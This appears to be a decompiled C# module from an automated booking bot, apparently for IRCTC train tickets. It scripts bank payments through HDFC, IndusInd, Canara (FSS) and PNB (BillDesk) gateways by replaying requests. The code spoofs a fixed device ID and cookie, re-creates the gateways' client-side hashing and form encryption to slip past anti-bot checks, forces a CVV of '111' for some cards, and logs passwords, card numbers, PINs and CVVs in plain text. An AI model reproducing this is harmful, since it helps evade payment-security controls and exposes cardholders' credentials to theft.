                        text2 = "acsRadio=payerAuth&xdeviceId=81606134528219156805110359691&bTz=Asia%2FKolkata";
                        clsMain.Lock("First Hit : Inp = " + text2);
                        if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_93);
                            string_90 = "Indusind Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("First Output htm = " + string_94);
                    }
                    if (string_94.Contains("Authenticate Transaction") | string_94.Contains("Enter your Password"))
                    {
                        string text3 = "txtLogin\" value=\"";
                        int length = text3.Length;
                        text3 = string_94.Substring(string_94.IndexOf(text3) + length);
                        string text4 = text3.Substring(0, text3.IndexOf("\""));
                        text3 = "var saltx =\"";
                        length = text3.Length;
                        text3 = string_94.Substring(string_94.IndexOf(text3) + length);
                        string text5 = text3.Substring(0, text3.IndexOf("\""));
                        string_91 = string_92;
                        string_92 = "https://netsafe.hdfcbank.com/ACSWeb/com.enstage.entransact.servers.AccessControlServerSSL?perform=USER_AUTH_IMPROVEMENT&CANCEL=false";
                        string text6 = method_124(text.ToString());
                        if (!string.IsNullOrEmpty(text6))
                        {
                            text6 += text5;
                            text6 = method_124(text6);
                        }
                        text2 = "&txtLogin=" + text4 + "&txtPassword=" + text6 + "&textSalt=" + text5;
                        clsMain.Lock("Second Hit : Inp = " + text2);
                        if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Second Hit Output = " + string_94);
                        if (string_94.Contains("Invalid Password"))
                        {
                            clsMain.Lock("INVALID TR PASSWORD = " + string_93);
                            string_90 = "invalid TR Password";
                            updateTStatus_2?.BeginInvoke(2, "Invalid Txn Password in HDFC", tCntrlName_, null, null);
                            return false;
                        }
                        updateTStatus_2?.BeginInvoke(2, "HDFC Process 3/3...", tCntrlName_, null, null);
                        if (string_94.Contains("secure.payu.in"))
                        {
                            text2 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                            clsMain.Lock("Second Hit : Inp = " + text2);
                            if (!_Request(string_92, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                            {
                                clsMain.Lock("Second Hit Failed. err = " + string_93);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                return false;
                            }
                            clsMain.Lock("Second Hit Output = " + string_94);
                        }
                        string_90 = string_92;
                        string_89 = string_94;
                        num = 1;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessInduNetBanking", ex.Message);
                    num = 0;
                }
                return num != 0;
            }
            string_90 = "Some thing went wrong with InduSind Payment";
            clsMain.Lock("Html doesn't contains indusind, returning.");
            return false;
        }

        private bool method_122(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_90 = "";
            string_89 = "";
            clsMain.Lock("Enter ProcessInduNetBanking.");
            if (string_86.Contains("netsafe.hdfcbank.com"))
            {
                string text = class3_0.string_69;
                text = "https://securegw.paytm.in/";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                array[0].Trim();
                string string_91 = "";
                string text2 = array[7];
                string text3 = class3_0.Method_SerialInp(string_86, ref string_91, false);
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_92 = "";
                string string_93 = "";
                try
                {
                    updateTStatus_2?.BeginInvoke(2, "Process 1/3.", tCntrlName_, null, null);
                    Cookie cookie = new Cookie("enTrace", "81606134528219156805110359691")
                    {
                        Domain = "netsafe.hdfcbank.com"
                    };
                    cookieContainer_.Add(cookie);
                    if (string_91.Contains("https://migs.mastercard.co.in"))
                    {
                        clsMain.Lock("First Hit : Inp = " + text3);
                        if (!_Request(string_91, text3, text, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_92);
                            string_90 = "Indusind Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("First Output htm = " + string_93);
                        text3 = class3_0.Method_SerialInp(string_93, ref string_91, false);
                    }
                    clsMain.Lock("First Hit : Inp = " + text3);
                    updateTStatus_2?.BeginInvoke(2, "Process 2/3..", tCntrlName_, null, null);
                    if (!_Request(string_91, text3, text, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_92);
                        string_90 = "Indusind Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_93);
                    if (string_93.Contains("I want to use"))
                    {
                        string_91 = "https://netsafe.hdfcbank.com/ACSWeb/com.enstage.entransact.servers.AccessControlServerSSL?perform=DEBIT_CARD_STATUS_STATIC";
                        text3 = "acsRadio=payerAuth&xdeviceId=81606134528219156805110359691&bTz=Asia%2FKolkata";
                        clsMain.Lock("First Hit : Inp = " + text3);
                        if (!_Request(string_91, text3, text, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_92);
                            string_90 = "Indusind Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("First Output htm = " + string_93);
                    }
                    if (string_93.Contains("Authenticate Transaction") | string_93.Contains("Enter your Password"))
                    {
                        string text4 = "txtLogin\" value=\"";
                        int length = text4.Length;
                        text4 = string_93.Substring(string_93.IndexOf(text4) + length);
                        string text5 = text4.Substring(0, text4.IndexOf("\""));
                        text4 = "var saltx =\"";
                        length = text4.Length;
                        text4 = string_93.Substring(string_93.IndexOf(text4) + length);
                        string text6 = text4.Substring(0, text4.IndexOf("\""));
                        text = string_91;
                        string_91 = "https://netsafe.hdfcbank.com/ACSWeb/com.enstage.entransact.servers.AccessControlServerSSL?perform=USER_AUTH_IMPROVEMENT&CANCEL=false";
                        string text7 = method_124(text2.ToString());
                        if (!string.IsNullOrEmpty(text7))
                        {
                            text7 += text6;
                            text7 = method_124(text7);
                        }
                        text3 = "&txtLogin=" + text5 + "&txtPassword=" + text7 + "&textSalt=" + text6;
                        clsMain.Lock("Second Hit : Inp = " + text3);
                        if (!_Request(string_91, text3, text, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_92);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Second Hit Output = " + string_93);
                        if (string_93.Contains("Invalid Password"))
                        {
                            clsMain.Lock("INVALID TR PASSWORD = " + string_92);
                            string_90 = "invalid TR Password";
                            updateTStatus_2?.BeginInvoke(2, "Invalid Txn Password", tCntrlName_, null, null);
                            return false;
                        }
                        updateTStatus_2?.BeginInvoke(2, "Process 3/3...", tCntrlName_, null, null);
                        if (string_93.Contains("https://migs.mastercard.co.in"))
                        {
                            text3 = class3_0.Method_SerialInp(string_93, ref string_91, false);
                            clsMain.Lock("Second Hit : Inp = " + text3);
                            if (!_Request(string_91, text3, text, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                            {
                                clsMain.Lock("Second Hit Failed. err = " + string_92);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                return false;
                            }
                            clsMain.Lock("Second Hit Output = " + string_93);
                        }
                        string_90 = string_91;
                        string_89 = string_93;
                        num = 1;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessInduNetBanking", ex.Message);
                    num = 0;
                }
                return num != 0;
            }
            string_90 = "Some thing went wrong with InduSind Payment";
            clsMain.Lock("Html doesn't contains indusind, returning.");
            return false;
        }

        private string method_124(string string_86)
        {
            using (SHA256 sHA = SHA256.Create())
            {
                byte[] array = sHA.ComputeHash(Encoding.UTF8.GetBytes(string_86));
                StringBuilder stringBuilder = new StringBuilder();
                for (int i = 0; i < array.Length; i++)
                {
                    stringBuilder.Append(array[i].ToString("x2"));
                }
                return stringBuilder.ToString();
            }
        }

        internal bool method_125(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            string_90 = "";
            string_89 = "";
            clsMain.Lock("Enter ProcessInduNetBanking.");
            if (string_86.Contains("payments.payu.in"))
            {
                string string_91 = class3_0.string_69;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string string_92 = array[1];
                string string_93 = array[2];
                string string_94 = "";
                string text2 = class3_0.Method_SerialInp(string_86, ref string_94, false);
                CookieContainer cookieContainer_ = null;
                string text3 = "https://indusnet.indusind.com/corp/";
                string string_95 = "";
                string string_96 = "";
                try
                {
                    clsMain.Lock("First Hit : Inp = " + text2);
                    if (!_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_95);
                        string_90 = "Indusind Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_96);
                    if (!string.IsNullOrEmpty(string_96.Trim()) && string_96.Contains("Welcome to IndusNet"))
                    {
                        int startIndex = string_96.IndexOf("ACTION=");
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        int length = string_96.IndexOf("\"", startIndex) - startIndex;
                        string text4 = string_96.Substring(startIndex, length).Trim();
                        startIndex = string_96.IndexOf("var randomkey");
                        startIndex = string_96.IndexOf("'", startIndex) + 1;
                        length = string_96.IndexOf("'", startIndex) - startIndex;
                        string str = Class12.smethod_33(string_96.Substring(startIndex, length) + string_50, string_92);
                        string_91 = string_94;
                        string_94 = text3 + text4;
                        text2 = "CorporateSignonCorpId=" + text + "&CorporateSignonPassword=" + HttpUtility.UrlEncode(str).Replace("%3d", "%3D") + "&isEncrypted=Y&Action.ShoppingMall.Signon=Y";
                        clsMain.Lock("Second Hit : Inp = " + text2);
                        if (!_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_95);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Second Hit Output = " + string_96);
                        if (!string_96.Contains("Payment Details"))
                        {
                            string_90 = "Failed while Login into Indusind Bank";
                            if (string_96.IndexOf("User ID or Login Password entered by you is incorrect", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                string_90 = "Invalid User ID or Login Password";
                            }
                            clsMain.Lock("Second Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        if (string_96.Contains("Please enter valid Answer for Question"))
                        {
                            string text5 = string_96;
                            string text6 = text5.Substring(text5.IndexOf("Question : ") + 11);
                            string text7 = text6.Substring(0, text6.IndexOf("\r"));
                            text6 = text5.Substring(text5.IndexOf("value == \"A") + 11);
                            text6 = text6.Substring(text6.IndexOf("BANKAWAYTRAN"));
                            string string_97 = text6.Substring(0, text6.IndexOf("\""));
                            string text8 = Interaction.InputBox("Enter Debit Card Grid Value For Following Digit: " + "sss");//(text7.Contains("In what city is your vacation") ? "D+GANJ" : ((!text7.ToUpper().Contains("FRIEND")) ? "CAT" : "JAVED"));
                            text2 = "answer1=" + text8 + "&CAPSSTATUS=&CAPSVALUE=&userAction=A";
                            clsMain.Lock("Third Hit : Inp = " + text2);
                            if (!_Request(string_97, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_95);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                return false;
                            }
                            clsMain.Lock("Third Hit : Output = " + string_96);
                        }
                        startIndex = string_96.IndexOf("UserAccountsIndex");
                        startIndex = string_96.IndexOf("<option", startIndex) + 1;
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        length = string_96.IndexOf("\"", startIndex) - startIndex;
                        string s = string_96.Substring(startIndex, length).Trim();
                        s = ((!int.TryParse(s, out var result)) ? "1" : ((result > 5) ? "1" : result.ToString()));
                        int num2 = 0;
                        while (true)
                        {
                            num2++;
                            startIndex = string_96.IndexOf("ACTION=");
                            startIndex = string_96.IndexOf("\"", startIndex) + 1;
                            length = string_96.IndexOf("\"", startIndex) - startIndex;
                            text4 = string_96.Substring(startIndex, length).Trim();
                            string_91 = string_94;
                            string_94 = text3 + text4;
                            string text9 = clsPostData.smethod_7("", string_96, "input", "MaskNo");
                            text2 = "MaskNo=" + text9 + "&UserAccountsIndex=" + s + "&DebitTxnMemo=&Action.Bills.ShoppingMall.MakePayment.Pay=Submit&Action.Bills.ShoppingMall.MakePayment.Pay.x=&Action.Bills.ShoppingMall.MakePayment.Pay.y=";
                            clsMain.Lock("Third Hit : Inp = " + text2);
                            if (_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                            {
                                clsMain.Lock("Third Hit : Output = " + string_96);
                                if (!string_96.Contains("The transaction could not be completed due to insufficient funds"))
                                {
                                    break;
                                }
                                if (num2 < 2)
                                {
                                    s = num2.ToString();
                                    continue;
                                }
                                string_90 = "The transaction could not be completed due to insufficient funds";
                                clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                                return false;
                            }
                            clsMain.Lock("Third Hit Failed. err = " + string_95);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        if (!string_96.Contains("Payment Confirmation"))
                        {
                            string_90 = "Failed while making Payment. Payment Not Done";
                            clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_96.IndexOf("ACTION=");
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        length = string_96.IndexOf("\"", startIndex) - startIndex;
                        text4 = string_96.Substring(startIndex, length).Trim();
                        string text10 = method_140("CorpID", string_96);
                        text10 = clsPostData.smethod_7("", string_96, "input", "ValCorpTxnPwdUserName");
                        if (text10.Length < 4)
                        {
                            text10 = text;
                        }
                        string_94 = text3 + text4;
                        clsMain.Lock("Third Hit : Output = " + string_96);
                        if (!string_96.Contains("var randomkey"))
                        {
                            string_90 = "Failed while making Payment. Payment Not Done";
                            clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_96.IndexOf("ACTION=");
                        startIndex = string_96.IndexOf("\"", startIndex) + 1;
                        length = string_96.IndexOf("\"", startIndex) - startIndex;
                        text4 = string_96.Substring(startIndex, length).Trim();
                        startIndex = string_96.IndexOf("var randomkey");
                        startIndex = string_96.IndexOf("'", startIndex) + 1;
                        length = string_96.IndexOf("'", startIndex) - startIndex;
                        string str2 = Class12.smethod_33(string_96.Substring(startIndex, length) + string_50, string_93);
                        text2 = "ValCorpTxnPwdUserName=" + text10 + "&tranType=T&ValCorpTxnPwdTxnPwd=" + HttpUtility.UrlEncode(str2) + "&ValCorpTxnPasscode=&Action.bills.ShoppingMall.TxnLogin.Ok=Submit&isEncrypted=Y";
                        string_91 = string_94;
                        string_94 = text3 + text4;
                        clsMain.Lock("Fourth Hit : Inp = " + text2);
                        if (!_Request(string_94, text2, string_91, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_96, ref string_95, ref webException_0))
                        {
                            clsMain.Lock("Fourth Hit Failed. err = " + string_95);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Fourth Hit : Output = " + string_96);
                        if (!string_96.Contains("Transaction Successfully") || string_96.Contains("transaction could not be processed"))
                        {
                            string_90 = "Payment Failed by Indusind";
                            clsMain.Lock("Fourth Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        string_90 = string_94;
                        int startIndex2 = string_96.IndexOf("id=\"PAID", StringComparison.CurrentCultureIgnoreCase);
                        startIndex2 = string_96.IndexOf("https://", startIndex2);
                        int length2 = string_96.IndexOf("\"", startIndex2) - startIndex2;
                        string_89 = string_96.Substring(startIndex2, length2).Trim();
                        num = 1;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessInduNetBanking", ex.Message);
                    num = 0;
                }
                return num != 0;
            }
            string_90 = "Some thing went wrong with InduSind Payment";
            clsMain.Lock("Html doesn't contains indusind, returning.");
            return false;
        }

        internal bool method_126(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessCanaraDebit.");
            if (string_86.Contains("fssnet.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[2];
                string text5 = array[3];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                try
                {
                    bool_27 = true;
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "Canara Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("paymentId"))
                    {
                        string text7 = "ECB";
                        int startIndex = string_94.IndexOf("function encrypData");
                        startIndex = string_94.IndexOf("var paymentId", startIndex);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("var encCaptcha");
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("CSRFToken", startIndex);
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text10 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("name=\"paymentId\"", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text11 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchWeb", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchTrackId", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string text12 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchErrUrl", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        clsMain.Lock("paymentIdKey: " + text8);
                        clsMain.Lock("Get Encrypted Data, inp = " + text8 + "||" + text7 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                        text = Class12.smethod_17(text, text8);
                        text2 = Class12.smethod_17(text2, text8);
                        text5 = Class12.smethod_17(text5, text8);
                        string text13 = Class12.smethod_17(text3, text8);
                        string text14 = Class12.smethod_17(text4, text8);
                        if (clsMain.getOTPDelegate_0 != null)
                        {
                            string[] array2 = clsMain.getOTPDelegate_0(text8 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4).Split(new string[1] { "||" }, StringSplitOptions.None);
                            text = array2[0];
                            text2 = array2[1];
                            text5 = array2[2];
                            text13 = array2[3];
                            text14 = array2[4];
                        }
                        clsMain.Lock("Loading Captcha");
                        if (updateTStatus_1 != null && !clsMain.control_0.IsDisposed)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for Canara Debit.", tCntrlName_, null, null);
                        }
                        string text15 = "8E9EZ";
                        string text16 = DateTime.Now.ToString("ddd MMM dd HH:mm:ss IST yyyy");
                        string string_95 = text8 + text9 + text + text2 + "A" + text5 + text15 + "0" + text16 + text11 + "file://///fss50//PGWAYF//config////brands//default//style.css//fss50//PGWAYF//config////brands//default///style.css//fss50//axisbank//Config//ipay//brands//default//label.propertiesIRCTC NEW PORTALhttps://www.irctc.co.in" + text12 + "01000" + 0 + "CANARA BANKhttps://www.irctc.co.in/eticketing/BankResponse0012510110125100" + text13 + "D" + text14 + "//fss50//PGWAYF//config////brands//default///footer.html";
                        string string_96 = Class12.smethod_22(text10).ToString().ToUpper();
                        string text17 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_95, string_96).ToString().ToUpper()).ToString().ToUpper(), string_96).ToString().ToUpper();
                        text17 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpdENhcmROdW1iZXIlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFY2FyZFBpblR5cGUlNUVjYXJkUGluJTVFcGFzc2xpbmUlNUVnc3RuVFhOSWQlNUVnc3RuRmxhZyU1RXBheW1lbnRJbml0VGltZSU1RXBheW1lbnRJZCU1RXN0eWxlQ3NzJTVFaGVhZGVyRmlsZSU1RWxhYmVsRmlsZSU1RW1yY2hOYW1lJTVFbXJjaFdlYiU1RW1yY2hUcmFja0lkJTVFcHltbnRJbnN0cm1udENDJTVFcHltbnRJbnN0cm1udERDJTVFcHltbnRJbnN0cm1udEFQJTVFcHltbnRJbnN0cm1udEREJTVFZWNvbUZsZyU1RWNhcHRjaGFGbGclNUVpbnN0TmFtZSU1RW1yY2hFcnJVcmwlNUVhdnNGbGclNUVoZWFkZXJUeXBlJTVFdGVybUlkJTVFaW5zdElkJTVFbXJjaElkJTVFbWFlc3Ryb0NoZWNrRmxhZyU1RXB5bW50SW5zdHJtbnRJTVBTJTVFZ3JpcHNGbGFnJTVFY3JlZGl0TW9udGglNUVjcmVkaXRZZWFyJTVFZGViaXRNb250aCU1RWNyZWRpdERlYml0Q2hlY2slNUVkZWJpdFllYXIlNUVyZGMlNUVydXBheVRyYW5UeXBlJTVFc2VsZWN0ZWRWYWx1ZSU1RWNoZWNrRGViaXQlNUVmb290ZXI%3D";
                        text6 = "paymentIdKey=" + text8 + "&hdndivType=&encCaptcha=" + text9.Replace("=", "%3D") + "&cspg=" + text17.Replace("^", "%5E") + "&CSRFToken=" + text10 + "&debitCardNumber=" + text + "&debitCardholderName=" + text2 + "&cardPinType=A&cardPin=" + text5 + "&cardCvd2pin=&passline=" + text15 + "&gstnTXNId=&gstnFlag=0&paymentInitTime=" + HttpUtility.UrlEncode(text16) + "&paymentId=" + text11 + "&styleCss=file%3A%2F%2F%2F%2F%2Ffss50%2F%2FPGWAYF%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2Fstyle.css&headerFile=%2F%2Ffss50%2F%2FPGWAYF%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2F%2Fstyle.css&labelFile=%2F%2Ffss50%2F%2Faxisbank%2F%2FConfig%2F%2Fipay%2F%2Fbrands%2F%2Fdefault%2F%2Flabel.properties&mrchName=IRCTC+NEW+PORTAL&mrchWeb=https%3A%2F%2Fwww.irctc.co.in&mrchTrackId=" + text12 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=0&ecomFlg=0&captchaFlg=" + 0 + "&instName=CANARA+BANK&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=125101&instId=10&mrchId=1251&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=" + text13 + "&creditDebitCheck=D&debitYear=" + text14 + "&rdc=&rupayTranType=&selectedValue=&checkDebit=&footer=%2F%2Ffss50%2F%2FPGWAYF%2F%2Fconfig%2F%2F%2F%2Fbrands%2F%2Fdefault%2F%2F%2Ffooter.html";
                        string_91 = "https://securepayments.fssnet.co.in/pgwayf/paymentpage.htm";
                        string_92 = "https://securepayments.fssnet.co.in/pgwayf/paymentrouter.htm";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Second Hit output = " + string_94);
                        if (!string_94.Contains("Please wait your Transaction is getting processed"))
                        {
                            string_90 = "Failed while providing Debit Card Details.";
                            clsMain.Lock("Second Hit Failed. Check HTML");
                            return false;
                        }
                        startIndex = string_94.IndexOf("result=") + 7;
                        length = string_94.IndexOf("&", startIndex) - startIndex;
                        int num = (string_94.Substring(startIndex, length).ToUpper().Contains("NOT") ? 1 : 0);
                        if (num != 0)
                        {
                            clsMain.Lock("Payment Failed");
                            string_90 = "Invalid Card Details, Payment Failed!";
                            return false;
                        }
                        clsMain.Lock("Success ProcessCanaraDebit isPaymentFailed = " + num);
                        string_89 = string_94;
                        string_90 = string_92;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessCanaraDebit", ex.Message);
                }
                finally
                {
                    bool_27 = false;
                }
                return false;
            }
            string_90 = "Some thing went wrong with Canara Payment";
            clsMain.Lock("Html doesn't contains fssnet.co.in, returning.");
            return false;
        }

        internal bool method_127(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessPNBDebit.");
            if (string_86.Contains("billdesk.com"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string str = array[6];
                string text2 = array[1];
                string text3 = array[2];
                string text4 = array[3];
                string text5 = array[4];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                string pattern = "^508[5-9]|65[2-3]|60[6-8]$";
                if (text2.Length < 2)
                {
                    text2 = "0" + text2;
                }
                try
                {
                    bool flag = Regex.IsMatch(text.Substring(0, 3), pattern) || Regex.IsMatch(text.Substring(0, 4), pattern);
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "PNB Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("BillDesk Payment Gateway"))
                    {
                        string text7 = "V";
                        string_94 = string_94.Replace("'", "\"");
                        if (text[0] != '6' && !(text.Substring(0, 2) == "50"))
                        {
                            if (text[0] == '5')
                            {
                                text7 = "M";
                            }
                        }
                        else
                        {
                            text7 = "Maestro";
                        }
                        if (flag || text.Substring(0, 3) == "607")
                        {
                            text5 = "111";
                        }
                        int startIndex = string_94.IndexOf("\"msg");
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string str2 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("hidOperation", startIndex) + 5;
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text8 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        string text9 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        string_91 = string_92;
                        string_92 = "https://www.billdesk.com/pgidsk/PGICommonGateway";
                        text6 = "cnumber=" + text + "&cardType=" + text7 + "&expmon=" + text2 + "&expyr=" + text3 + "&cvv2=" + text5 + "&cname2=" + HttpUtility.UrlEncode(str) + "&txtBankID=PMP&msg=" + HttpUtility.UrlEncode(str2) + "&hidOperation=" + text8 + "&hidRequestId=" + text9 + "&reqid=cc_processall";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "PNB Debit Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Second Output htm = " + string_94);
                        if (!string_94.Contains("pgidsk/PGIAuthProcessor"))
                        {
                            string_90 = "Failed while processing payment.";
                            clsMain.Lock("Second Hit Failed. Check HTML");
                            return false;
                        }
                        string_91 = string_92;
                        text6 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                        clsMain.Lock("Third Hit Inp = " + text6);
